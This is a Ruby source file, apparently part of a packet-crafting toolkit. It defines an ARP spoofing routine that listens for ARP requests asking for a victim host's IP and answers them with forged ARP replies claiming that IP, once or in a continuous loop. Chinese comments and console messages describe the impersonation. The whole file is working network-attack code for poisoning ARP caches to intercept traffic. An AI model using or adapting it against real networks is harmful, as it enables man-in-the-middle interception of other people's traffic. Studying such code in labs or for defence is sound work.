require_relative '../../protocol/arp_pac.rb'

class ARPP
	def self.arp_deceive(pcap, redo_time=1, scale=1)
		target_ip = arr_to_dot_dec($dst_ip)
		victim_ip = arr_to_dot_dec($victim_ip) #被冒充的主机的ip
		pcap.set_filter("arp and dst host #{victim_ip}") #抓那些询问谁是victim_ip的arp报文

		deceive_pac = ARPP.new
		deceive_pac.instance_eval do
			@arph.opcode = 2
			# @arph.set_mac_by_str($src_mac, :sender)
			@arph.set_addr_by_arr($victim_ip, :sender)
			@arph.set_mac_by_str($dst_mac, :receiver)
			@arph.set_addr_by_arr($dst_ip, :receiver)

			@etherh.dst_mac = $dst_mac
		end
		deceive_pac.renew

		sendpac = ->(){
			scale.times{pcap.send_packet(deceive_pac)}
			puts color_purple("响应了一次来自目标的arp请求，其请求解析的地址为：")
			print bit_str_to_int_arr(deceive_pac.arph.sender_ip), "\n"
		}

		if redo_time<=0
			pcap.loop do |this,pkt|
				sendpac.call
			end
		else
			redo_time.times do
				pcap.dispatch do |this,pkt|
					sendpac.call
					break
				end
			end
		end
		pcap.set_filter(nil)
	end
end